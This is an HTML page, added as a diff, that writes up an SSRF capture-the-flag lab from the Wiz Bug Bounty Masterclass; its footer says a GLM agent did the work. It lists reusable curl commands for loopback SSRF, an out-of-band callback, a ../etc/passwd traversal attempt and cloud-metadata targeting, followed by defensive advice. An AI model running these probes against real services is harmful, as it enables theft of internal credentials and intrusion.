@@ -1,0 +1,61 @@
+<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>06 · SSRF on Major Gaming Company —— 让服务器替我访问它的内网 · Wiz Masterclass 通关复盘</title><link rel="stylesheet" href="style.css">
+</head><body><header><nav>
+<a href="index.html">← 总览</a><span class="crumb">Wiz Bug Bounty Masterclass · 9/9 · GLM Agent 协作复盘</span>
+<div class="pager"><a href="wu-05.html">← 域名接管</a><a href="wu-07.html">GitHub OSINT →</a></div></nav></header>
+<main><article><h1>06 · SSRF on Major Gaming Company —— 让服务器替我访问它的内网</h1>
+<blockquote><p>系列第 6 题 · 对应真实事件：SSRF 触达内部云基础设施与敏感凭据（原赏金 $27,500，<br>九题中最高）· 我的净耗时：约 10 分钟</p></blockquote>
+<h2>题面</h2>
+<blockquote><p>You've found a gaming company's content service that fetches resources from<br>URLs you provide. But what happens when you point it somewhere the developers<br>never intended - like the server's own internal network?<br>Your mission: trick the server into making requests it shouldn't.</p></blockquote>
+<p>靶场地址：<code>https://&lt;REDACTED_DOMAIN&gt;/</code>（一个流媒体风格的"内容服务"）</p>
+<h2>我的判断路径</h2>
+<p>"服务端会抓取用户提供的 URL"是 SSRF 的题面标配。我的检测清单按成本排序：</p>
+<ol><li>找到那个吃 URL 的参数（页面 JS 里的 API 调用通常写得很明白）</li><li>先用正常值确认接口行为</li><li>依次注入：完整 URL（环回地址）→ 外部回连地址（带外验证）→ 路径穿越（顺手测）</li><li>观察服务端凭据是否随请求外泄——SSRF 的真正杀伤力在<strong>内部凭据</strong>，不在请求本身</li></ol>
+<h2>过程</h2>
+<h3>1. 定位参数</h3>
+<p>首页 JS 只有一个 API 调用：</p>
+<pre class="code"><code>/api/content/v2/module/{moduleId}/version/{version}/staged-files/{fileName}</code></pre>
+<p>先用正常值确认接口活着（返回 mock 文件内容的 JSON），然后进入注入。</p>
+<h3>2. fileName 吃下完整 URL：环回地址直通内网</h3>
+<p>我把 <code>fileName</code> 换成一个完整 URL——服务器<strong>没有做任何协议或目标校验</strong>，<br>直接替我请求了它的环回地址，并且把<strong>它发出的请求头原样回显</strong>：</p>
+<pre class="code"><code>GET /api/content/v2/module/1/version/1/staged-files/http://127.0.0.1/
+
+→ {"headers_sent": {
+     "Authorization": "Bearer &lt;REDACTED_TOKEN&gt;",
+     "User-Agent": "InternalAPI/1.0.0"},
+   "message": "Internal service response",
+   "service": "localhost", "status": "success"}</code></pre>
+<p>那个 Bearer token 是服务端访问内部 API 用的凭据。解码 JWT payload（结构保留，<br>值脱敏）：</p>
+<pre class="code json"><code>{"sub": "content-service",
+ "iss": "internal-auth",
+ "iat": 1705312176, "exp": 1705398576,
+ "scope": "internal:read internal:write",
+ "service_id": "cs-001",
+ "flag": "&lt;REDACTED&gt;"}</code></pre>
+<p>一个 <code>scope</code> 覆盖内部读写的服务身份凭据，外加 flag，一并到手。</p>
+<h3>3. 带外验证与对照实验</h3>
+<p>我又做了两组对照，把漏洞边界摸清楚：</p>
+<ul><li><strong>带外验证</strong>：让服务器去请求课程提供的回连检测域名（oast 类服务），</li></ul>
+<p>  返回 502 "returned unparseable JSON response"——错误信息证明<strong>服务器确实发出了出网请求</strong>，<br>  盲 SSRF 场景下这是标准的存在性证明</p>
+<ul><li><strong>路径穿越</strong>：<code>../etc/passwd</code> 被拦截（404），URL 编码变体会被反射回响应但不生效</li></ul>
+<p>  ——开发者<strong>防住了路径穿越，却没防 URL 注入</strong>，典型的"补了 A 漏了 B"</p>
+<h2>关键命令（脱敏后结构可复用）</h2>
+<pre class="code bash"><code>BASE="https://&lt;REDACTED_DOMAIN&gt;/api/content/v2/module/1/version/1/staged-files"
+
+curl "$BASE/test.json"                 # 正常行为基线
+curl "$BASE/http://127.0.0.1/"         # 环回 SSRF → 回显内部请求头（含凭据）
+curl "$BASE/http://&lt;回连检测域名&gt;/probe"  # 带外验证服务器侧确实发起请求
+curl "$BASE/../etc/passwd"             # 对照：路径穿越已被防住</code></pre>
+<h2>一个反直觉观察</h2>
+<p>这是九题中赏金最高的一道（$27,500），却只花了 10 分钟。**赏金标定的是危害深度，<br>不是发现难度**——SSRF 一旦能触达云元数据（<code>169.254.169.254</code>）拿临时凭据，<br>攻击者就能横向移动进整个云账号，所以厂商愿意为它付最高价。<br>找洞快慢和值多少钱，是两回事。</p>
+<h2>失败与弯路</h2>
+<p>无返工。唯一值得记的是顺序选择：先测环回地址而不是先测外网回连——<br>因为"环回 + 凭据回显"是最短路径直接拿结果，带外验证放在确认后补做。</p>
+<h2>防御视角（如果我是蓝队）</h2>
+<ol><li>URL 类参数做<strong>协议 + 目标白名单校验</strong>：拒绝环回、内网段、链路本地地址</li></ol>
+<p>   （含 169.254.169.254 云元数据）、以及解析后落在这些范围的域名（防 DNS rebinding）</p>
+<ol><li><strong>绝不回显服务端请求头/响应细节</strong>——本题的凭据泄露一半功劳在"回显"这个设计错误</li><li>出网请求走独立的代理层，剥离内部凭据，内部调用与外部抓取使用不同身份</li><li>内部服务凭据最小化：只读就别给 <code>internal:write</code>，并缩短有效期</li></ol>
+<h2>证据</h2>
+<ul><li><code>evidence/06-1-flag-submitted.png</code> —— 提交成功页面</li></ul></article></main>
+<footer>基于 GLM 驱动的 Agent 协作完成（2026-10-24）· <a href="https://www.wiz.io/bug-bounty-masterclass/certificate/43a82202-6aaa-4a0b-b43a-118f380d8af1" target="_blank" rel="noopener">官方证书</a> · 全部敏感内容已脱敏（见仓库 REDACTION.md）</footer>
+</body></html>
